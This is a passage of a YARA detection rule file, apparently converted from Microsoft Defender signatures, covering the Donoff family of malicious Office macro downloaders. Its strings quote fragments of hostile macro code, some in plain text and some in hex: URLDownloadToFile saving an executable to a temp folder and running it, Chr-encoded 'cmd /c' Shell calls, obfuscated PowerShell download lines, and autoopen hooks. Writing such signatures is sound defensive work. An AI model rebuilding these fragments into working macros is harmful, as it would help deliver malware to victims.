        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Price_System = \"User-Agent\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_4 = "= Price_Project + \"\\kkloepp\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_133
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f [0-32] 2f 72 65 61 64 2e 70 68 70 3f 66 3d 34 30 34}  //weight: 1, accuracy: Low
        $x_1_2 = "s = \"sssssssssssssssssssssssssssssssss" ascii //weight: 1
        $x_1_3 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 [0-5] 2c 20 22 43 3a 2f 57 69 6e 64 6f 77 73 2f 54 65 6d 70 2f [0-5] 2e 65 78 65 22 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_4 = {52 75 6e 20 28 22 43 3a 2f 57 69 6e 64 6f 77 73 2f 54 65 6d 70 2f [0-5] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_134
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "JRunBee_System = \"User-Agent\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_4 = "= JRunBee_Project + \"\\kkloepp\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_135
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Prished_System = \"User-Agent\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_4 = "= Prished_Project + \"\\kkloepp\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_136
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "LMGcII(mpkpRg) = Asc(Mid(AnGFHT, (mpkpRg Mod MtsIjH) + 1, 1))" ascii //weight: 1
        $x_1_2 = "RfSukB = LRGsCI((LRGsCI(bpwDjs) + LRGsCI(ZrOZau)) Mod 256)" ascii //weight: 1
        $x_1_3 = "kQPvbj = Asc(Mid(ivtRfl, RDgdDC, 1)) Xor RfSukB" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_137
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Launcher_System = \"User-Agent\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_4 = "= Launcher_Project + \"\\kkloepp\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_138
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = ".Open ChrW(112) & ChrW(111) & ChrW(83) & ChrW(116)" ascii //weight: 2
        $x_2_2 = "= Environ(ChrW(116) & ChrW(77) & ChrW(80))" ascii //weight: 2
        $x_1_3 = "iiGHVhksjdbjksd.iuytfdcsdfsdfsdf" ascii //weight: 1
        $x_1_4 = "lOIUgvhsadDc.Send" ascii //weight: 1
        $x_1_5 = "= Shell(DFuhijsfasd," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_139
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "e(247, \"i p.ga/nc/outct/t'ntanDtib.Ncbw(YiPe|'aologherqash/phgrdlo)eCWetj-nJrix )snoweaxg.m-ie:t(iSow.nlet eoeBhIs" ascii //weight: 1
        $x_1_2 = "e(119, \"opcRRs.de./mtwmm/iMc:m.o1mitwi/vtrZ/aci/eUpwng2yPh/x" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_140
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "X/RXmIaR6tXt3RlQeuIv6aY7lVYvXgeg6.RcKVo6mYz/3V1Vq3/V1RqgI.RVeQVxgVe3'VX,73'6z%VTYYERXMVVPX%X\\I" ascii //weight: 1
        $x_1_2 = "XVcX3mzKd7.RezxueRg 7z/Kc3 6XpzoK3wuRegrYsRXhVeIlYYlz.KeIxQue3 XV-XwI7 gVhgIiudRdRz" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_141
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Corporation_System = \"User-Agent\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_4 = "= Corporation_Project + \"\\kkloepp\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_142
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DX/OtNeyp.J/IaeNSi)):.dl( rtppm/i;tcnmtemF)cSetttoppeWi$hscmmj l('y.etbmCc(SyT$Oobee[at -cexl=de,w-WEiplG'e ..Fml:eNtt)dta:c(cela$y]i;eNloGahf)j.elqktf(bmhnxeaoeOeSwieP/m-t.oUd.aawst" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_143
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function abcdefopus(yuiuv)" ascii //weight: 1
        $x_1_2 = "silmarion = Mid(UserForm1.TextBox1, Len(UserForm1.TextBox1) + num - key, 1)" ascii //weight: 1
        $x_1_3 = "qwertycard = qwertycard + silmarion(abcdefopus(Mid(hollyvirus, i, 1)), 5)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_144
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rltShil.cepWS\")))" ascii //weight: 1
        $x_1_2 = "'wdmmmn]c.l=:elhwSiteeS,-aeip.:oIo[/ceence twy Ot" ascii //weight: 1
        $x_1_3 = "cplyeciieHy moPhdsxdtil -uoe xonor\")" ascii //weight: 1
        $x_1_4 = "ae.n-/cmtmcrwep:.-hxodw/isdesaldwm-pntsm/a/oyti\")" ascii //weight: 1
        $x_1_5 = "Err.Raise 777" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_145
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "A2pCXj0v7Cp8Dha = BJ3XjdKrDHQG(A2pCXj0v7Cp8Dha, N3sAgbhBTg7LFmK, EitIa7At2P)" ascii //weight: 1
        $x_1_2 = "c4aEs0qpr = z2Loet0.uCskYx4KoIERlE7(c4aEs0qpr, V5gHd8pluoxfF(xLoCsjs8pX76, EitIa7At2P, HdLqMAX6, xgiPaxIiy))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_146
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 72 72 61 79 28 22 ?? ?? [0-16] 22 2c 20 53 68 65 6c 6c 28 ?? ?? ?? ?? [0-16] 2c 20 30 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 22 2e 22 0d 0a 05 00 15 00 20 3d 20 22 65 22 0d 0a 05 00 15 00 20 3d 20 22 78 22 0d 0a 05 00 15 00 20 3d 20 22 65 22 0d 0a 05 00 15 00 20 3d 20 22 27 22}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 44 22 0d 0a 05 00 15 00 20 3d 20 22 6f 22 0d 0a 05 00 15 00 20 3d 20 22 77 22 0d 0a 05 00 15 00 20 3d 20 22 6e 22 0d 0a 05 00 15 00 20 3d 20 22 6c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_147
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"N EREHW\") + Mid(\"authorityame LIKE 'Python %'hound\", 10, 19)" ascii //weight: 1
        $x_1_2 = "= Left(\"wiinflect\", 2) + Ucase(\"NmgMt\") + Lcase(\"S:\\\\\")" ascii //weight: 1
        $x_1_3 = "= Ucase(\"WHeRE Na\") & Ucase(\"ME LIKE 'PyT\") & Right(\"accountanthon %'\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_148
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(Chr(99) & Chr(109) & Chr(100) & Chr(32) & Chr(47) & Chr(99)" ascii //weight: 1
        $x_1_2 = "& Chr(100) & Chr(111) & Chr(114) & Chr(105) & Chr(46) & Chr(101) +" ascii //weight: 1
        $x_1_3 = "& Chr(47) & Chr(112) & Chr(105) & Chr(100) & Chr(111)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_149
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CallByName CofeeShop, LocalBrowser.OptionButton1.Tag" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_4 = "= Boombox_Project + \"\\kkloepp\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_150
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"8/hVGO\", \"VwGihnVmGgVm8tGsh:\\/\\V.V\\V/r8oVothG\\Vci/mGvhO2:/W8hin83G2O_GPOr88oche8sO/sGSGtGar8tV/uph\")" ascii //weight: 1
        $x_1_2 = "(\"pax9zL1Gh\", \"waiGna9m1gGmptsG:aG\\\\h.xx\\rGaooL1tp\\c1aimavp2L:xWLpin9132x_zLPLroLzcLezssh\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_151
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_2 = "CreateObject(\"microsoft.xmlhttp\")" ascii //weight: 1
        $x_1_3 = "Environ(\"tmp\")" ascii //weight: 1
        $x_1_4 = "CreateObject(\"adodb.stream\")" ascii //weight: 1
        $x_1_5 = "MsgBox \"Thank You. Please Click OK\"" ascii //weight: 1
        $x_1_6 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 63 6c 6f 73 65 28 29 [0-8] 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_152
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"1664U1856U1856U1792U928U752U752U1744U1856U1728U1600U1616U1840U1680U1648U1760U1840U736U1584U1552U752U1712U880U1696U1664U1824U1856U832U1664U1616U1824U1856U1648\"" ascii //weight: 1
        $x_1_2 = "agreeks = TREwozner(agreeks, \"bri\", \"s\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_153
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kV q/AHcHV Z8pAkozwuqeHkrzskhGe8lGlq.AeqzxAzeq AA-qwHX qhqiVkdAdGAeHHnuH zu-XGn77o8VpA 7-qeHApV qb8yApz7a8XszHs8 AA(" ascii //weight: 1
        $x_1_2 = "& \"8hk8wHi7ruq.GqeVuxueA'kH)z k8&uZ uk%zXTAHE8MuzPkq%Z\\8A\" & \"\\AhAwzAiHurA.He8HxqAe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_154
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 ?? ?? ?? ?? ?? ?? ?? 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 22 20 26 20 22 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 52 75 6e 20 ?? ?? ?? ?? 28 22 63 22 2c 20 22 6d 22 29 20 26 20 22 64 22 20 26 20 ?? ?? ?? ?? 28 22 2e 65 22 2c 20 22 78 65 20 2f 53 20 2f 43 20 65 63 68 6f 20}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"w\" & \"s\" & \"c\" & \"r\" & \"i\" & \"p\" & \"t \"" ascii //weight: 1
        $x_1_4 = {2e 52 75 6e 20 [0-10] 20 26 20 ?? ?? ?? ?? ?? ?? ?? ?? 20 26 20 22 5c ?? ?? ?? ?? ?? ?? 2e 6a 73 22 2c 20 31 2c 20 54 72 75 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_155
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "6uJDCFSQ8xB9PG13KvO0qV7ZkE5fYgmM4XNT" ascii //weight: 1
        $x_1_2 = ".top/af/hjt67t\", \"RRDD\", \"om\")" ascii //weight: 1
        $x_1_3 = "\\jhg6fgh\", \"RRDD\", \"om\")" ascii //weight: 1
        $x_1_4 = "/FsMflooY\", \"RRDD\", \"om\")" ascii //weight: 1
        $x_1_5 = "TrfHn4\", \"RRDD\", \"om\")" ascii //weight: 1
        $x_1_6 = "\\hH60bd\", \"RRDD\", \"om\")" ascii //weight: 1
        $x_1_7 = "\"e.%a\" & \"tad\" & \"ppa%'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_156
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ")t^n\" + \"e^\" + \"il\" + \"cbe\" + \"w.^t\" + \"^e\" + \"n.\" + \"m^e\" + \"^t^s\" + \"y^s\" + \" t^c\" + \"ej^\" + \"bo^-\" + \"w^e\" + \"n^(^ ;" ascii //weight: 1
        $x_1_2 = {65 7d 2c 22 20 2b 20 22 7b 68 74 22 20 2b 20 22 74 22 20 2b 20 22 70 3a 2f 22 20 2b 20 22 2f 22 20 2b 20 [0-32] 20 2b 20 22 2f 6b 65 79 73 2e 65 78 22 20 2b 20 22 65 7d 29 22 20 2b 20 22 29 20 7b 20 74 5e 22 20 2b 20 22 72 79 20 7b 20 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_157
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 64 6f 64 62 2e 2f 00 2e 41 70 70 6c [0-47] 63 72 69 70 74 2e 2f 00 50 72 6f 63 4f 00 54 79 70 2f 00 77 72 69 74}  //weight: 1, accuracy: Low
        $x_1_2 = {5f 5f 31 2e 4f 70 65 6e 20 09 00 28 31 30 20 2d 20 28 32 20 2b 20 31 20 2b 20 32 29 29 2c 20 0f 00 2c 20 46 61 6c 73 65 [0-31] 5f 5f 31 2e 53 65 6e 64}  //weight: 1, accuracy: Low
        $x_1_3 = {20 2d 20 31 29 2e 0f 00 20 2b 20 [0-15] 28 72 64 62 20 2d 20 31 29 2e [0-9] 29 20 2f 20 [0-31] 28 73 62 74 29 20 2f 20 [0-31] 28 73 62 74 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 22 b0 01 50 01 22 2c 20 22 09 00 09 00 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_158
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 2b 20 4c 65 6e 28 [0-16] 54 68 65 6e [0-16] 53 68 65 6c 6c 20 [0-16] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 46 6f 72 6d 5f 31 2e 45 64 69 74 [0-2] 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = "= ThisDocument.Bookmarks.Count" ascii //weight: 1
        $x_1_4 = {3d 20 30 20 54 68 65 6e [0-16] 20 3d 20 [0-16] 20 2b 20 43 68 72 24 28}  //weight: 1, accuracy: Low
        $x_1_5 = "= UBound(" ascii //weight: 1
        $x_1_6 = {53 75 62 20 61 75 74 6f 6f 70 65 6e 28 29 [0-16] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_7 = "attribute vb_name = \"thisdocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_159
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Array(Timer(), Timer(), Timer()," ascii //weight: 1
        $x_1_2 = "= Join(Array(" ascii //weight: 1
        $x_1_3 = "& Array(" ascii //weight: 1
        $x_1_4 = "= Right(Left(" ascii //weight: 1
        $x_1_5 = "= Left(Right(" ascii //weight: 1
        $x_1_6 = "+ Chr(" ascii //weight: 1
        $x_1_7 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e [0-2] 46 75 6e 63 74 69 6f 6e 20 [0-8] 28 29 [0-16] 20 3d 20 22 [0-8] 22 [0-2] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_8 = {3d 20 53 68 65 6c 6c 28 [0-16] 53 74 72 52 65 76 65 72 73 65 28 [0-8] 29 [0-16] 2c 20 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_160
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
